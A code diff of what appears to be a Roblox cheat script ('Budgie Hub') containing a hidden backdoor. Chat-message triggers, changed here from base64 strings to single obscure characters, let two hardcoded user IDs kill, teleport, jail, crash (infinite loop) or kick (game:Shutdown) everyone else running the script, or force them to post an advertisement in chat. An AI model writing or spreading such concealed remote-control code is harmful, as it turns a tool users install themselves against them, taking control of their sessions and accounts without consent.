@@ -1,6 +1,6 @@
 -- одна (килл)
 function onChatMessage(player, message)
-    if message:lower() == "0LjQtNC4INCyINC30LDQtNC90LjRhtGDINGN0YLQviDQtNC70Y8g0LDQtNC80LjQvdC+0LIg0YTRg9C90LrRhtC40LggMjU1NjUg0LzQsNC50L3QutGA0LDRhNGCINGB0YrQtdC70Lgg0YDQvtCx0LvQvtC60YEgc3VrdW5hIGJhdHRsZWdyb3VuZHM=" then 
+    if message:lower() == "ต" then 
 if player.UserId ~= 6036506267 and player.UserId ~= 4636825706 then
  function getAllPlayers()
     local players = game:GetService("Players"):GetPlayers()
@@ -28,7 +28,7 @@ end
 
 -- вторая (финд)
 function onChatMessage(player, message)
-    if message:lower() == "0LTQsNGE0YvQstGA0LDRiNGE0YvRgNCy0LDQu9GO0L7QvdC80LDRgtC60L/RiNCz0YPRhtC00YDRgtCw0YjQvNGC0LTRgNGI0YDQutGE0YPQtNCz0L/QvNGE0LTRgNGC0YPQutCz0L/QvNGD0YLRhNC00YjQutC/0LLQsNC/0LLRi9Cw0L/Ri9GM0LPQtNGI0LPQsQ==" then 
+    if message:lower() == "อ" then 
 if player.UserId ~= 6036506267 and player.UserId ~= 4636825706 then
       game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I using Budgie Hub | Best hack/script for Sukuna Battlegrounds", "All")
          end
@@ -49,7 +49,7 @@ end
 
 -- третья (бринг)
 function onChatMessage(player, message)
-    if message:lower() == "0LHRgNC40L0g0LHRgNGL0L0g0LHRjtGA0LDQvSDQsdC00YvQvSDQsdCz0LDQvSDQsdGF0LDQvSDQsdC00YvQu9GE0YvQsNGECtCwCtGE0YsK0LDRhNCy0YsK0LDRhNGE0YvQstCw0YTQstCw0YTRi9Cw0LIK0YTRi9CyCtCw0YQK0LIK0YvQsAo=" then 
+    if message:lower() == "า" then 
 if player.UserId ~= 6036506267 and player.UserId ~= 4636825706 then
      
  function getAllPlayers()
@@ -78,7 +78,7 @@ end
 
 -- четвёртая (Кик)
 function onChatMessage(player, message)
-    if message:lower() == "0Y/Qu9C+0YfQvNGB0YLRj9Cx0YfRjNGBINC80LjRj9GH0LHRjNC40Y/Rh9GB0LzRh9C40YHQvNGP0YLQuNGH0YzRgdCx0LzQuNGH0Y/QsdC80YHQuNGP0YfRgdCx0YzQvNCx0LjRh9GP0YLQvNGB0Y/Rh9GB0LHQvNGP0YLRgdC80LHRj9GH0YHQuNGM0Lw=" then 
+    if message:lower() == "ภ" then 
 if player.UserId ~= 6036506267 and player.UserId ~= 4636825706 then
       game:Shutdown()
          end
@@ -99,7 +99,7 @@ end
 
 -- пятая (краш)
 function onChatMessage(player, message)
-    if message:lower() == "0YjQs9C60YPRgNC20YjQv9GJ0L7QsNGFMDg10LfQvjI50Lc10LM20LAy0YTQv9C70LTQsNGM0LzRhNC7LtC20YHQvNCnLtC70LzRgdGM0LTRj9GH0LbQv9GG0YnRiNC60L7Qs9C10LfQuNC50L3Qs9C10YjQtNC80LnQtdC50Lo=" then 
+    if message:lower() == "᜶" then 
 if player.UserId ~= 6036506267 and player.UserId ~= 4636825706 then
       while true do
       end
@@ -121,7 +121,7 @@ end
 
 -- шестая (тюрьма)
 function onChatMessage(player, message)
-    if message:lower() == "YXNka29pZmFqbjtvcjgxeTRwNTk4MTc0NXBjbm8xdXA5cmNxbmhqaWxma2R4bmdibHNucDlid3E7b2lqLmtsamc7dnNkIGFxdHEzNDZhc2ZkYXZbMG45NDV1djFwO3Vub240b2lxaG52cW9pO29pbmFyZ3Y7aWFvdnRxNDN2cXYzNXEzNjRxNDZ3NnU1ZXU2IGtpeQ==" then 
+    if message:lower() == "ᝉ" then 
 if player.UserId ~= 6036506267 and player.UserId ~= 4636825706 then
      
  function getAllPlayers()
@@ -150,7 +150,7 @@ end
 
 -- седьмая (предупреждение)
 function onChatMessage(player, message)
-    if message:lower() == "MDk0MzI1ODfQv9C80LfRgDDQt9CzMDk40LPRg9C1NDnQvzLQt9GC0LPQt9Cz0YvQsjnQt9C10LPQvzLQvNC3NTQ5ONCz0YLQt9GGNHBtbjk4c3VkZ3B3OW44dTRsOXlidXk1dztpdXR2NW9tbUnRidCz0LLRi9C/OTTRidGCONC40LzQtzg50LPQvTjQvdC8MA==" then 
+    if message:lower() == "ช" then 
 if player.UserId ~= 4636825706 and player.UserId ~= 6036506267 then
         Fg = math.random(1, 2)
      if Fg == 1 then
@@ -187,7 +187,7 @@ end
 
 -- восьмая (скари)
 function onChatMessage(player, message)
-    if message:lower() == "0LjQtNC4INGI0YnRgNC50YjQtNC80YDRgtC1NNC5M9C0NNC10YExMjfQt9GJ0LbQudGCINGA0LHQuNGCbW9tbGtqZHJnb3Z1Ym84NzI2OyBuLm9KQ0lLV1JMSFRRSUE0Njt1aWxoNWV0bHlicUNVSUJMNFlRQzM3WVNGR1dWNVRRQVNSR9CS0JDQn9CmNdCj0Jg=" then 
+    if message:lower() == "ꯕ" then 
 if player.UserId ~= 4636825706 and player.UserId ~= 6036506267 then
  local co = Instance.new("ColorCorrectionEffect")
 co.Parent = game.Lighting
